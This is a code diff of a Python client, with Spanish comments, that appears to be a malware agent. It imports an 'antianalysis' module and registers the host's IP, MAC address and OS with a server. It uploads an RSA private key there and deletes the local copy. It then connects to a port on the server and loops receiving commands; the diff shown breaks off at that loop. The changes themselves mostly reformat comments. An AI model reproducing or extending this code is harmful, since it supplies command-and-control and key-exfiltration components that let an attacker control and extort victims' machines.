@@ -6,9 +6,6 @@ import platform
 import antianalysis
 import subprocess
 
-# Variable global para almacenar el ID del agente
-agent_id = None
-
 def get_ip_address():
     ip = socket.gethostbyname(socket.gethostname())
     return ip
@@ -22,13 +19,11 @@ def load_private_key():
         print("El archivo de clave privada no fue encontrado.")
         return None
 
-# Establecer el agent_id en un archivo
-def set_agent_id(id):
+def set_agent_id(id): # Establecer el agent_id en un archivo
     with open("agent_id.json", "w") as file:
         json.dump({"agent_id": id}, file)
 
-# Obtener el agent_id desde el archivo
-def get_agent_id():
+def get_agent_id(): # Obtener el agent_id desde el archivo
     try:
         with open("agent_id.json", "r") as file:
             data = json.load(file)
@@ -36,8 +31,8 @@ def get_agent_id():
     except (FileNotFoundError, json.JSONDecodeError):
         return None
 
-
 def register_agent():
+
     ip = get_ip_address()
     mac = antianalysis.get_mac_address()
     so = platform.system() + platform.version()
@@ -46,7 +41,6 @@ def register_agent():
     if private_key is None:
         print("No se pudo cargar la clave privada. No se puede registrar el agente.")
         return None
-    
     server_url = 'http://127.0.0.1:5000/register_agent'
     data = {
         'ip': ip,
@@ -56,32 +50,25 @@ def register_agent():
     files = {
         'private_key': ('rsa_private.pem', private_key, 'application/x-pem-file')
     }
-
     response = requests.post(server_url, data=data, files=files)    
     if response.status_code == 200:
         response_json = response.json()
         agent_id = response_json.get('agent_id')
-        set_agent_id(agent_id)  # Guardar el ID en JSON 
+        set_agent_id(agent_id)  # Guardar el agent ID en JSON 
         print(f"Agente registrado con éxito. ID: {agent_id}")
-        os.remove("rsa_private.pem")  # Eliminar la clave privada después de transmitirla correctamente
+        os.remove("rsa_private.pem")  # Eliminar la clave privada después de transmitirla correctamente al servidor
     else:
         print(f"Error al registrar el agente: {response.text}")
         return None
 
 def get_private_key():
-    # Obtener el ID del agente desde memoria
     agent_id = get_agent_id()
     if agent_id is None:
         print("No se ha registrado un agente. No se puede obtener la clave privada.")
         return None
-
     server_url = f'http://127.0.0.1:5000/download_private_key/{agent_id}'
-    
-    # Realizar la solicitud GET para obtener el archivo .pem
     response = requests.get(server_url)
-    
     if response.status_code == 200:
-        # Guardar la clave privada en un archivo en el sistema del cliente
         with open('rsa_private.pem', 'wb') as f:
             f.write(response.content)
         print("Clave privada descargada con éxito.")
@@ -92,20 +79,15 @@ def get_private_key():
 def connect_to_server():
     server_host = '127.0.0.1'
     server_port = 5001  
-
     agent_id = get_agent_id()  # Obtener el ID antes de conectarse
     if agent_id is None:
         print("Error: No se encontró el ID del agente. Regístrate primero.")
         return  
-
     try:
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         agent_socket.connect((server_host, server_port))
         print(f"Agente {agent_id} conectado al servidor.")
-
-        # Enviar el agent_id al servidor al conectar
-        agent_socket.send(str(agent_id).encode('utf-8'))
-
+        agent_socket.send(str(agent_id).encode('utf-8')) # Enviar el agent_id al servidor al conectar
         while True:
             command = agent_socket.recv(1024).decode('utf-8')
             print(command)
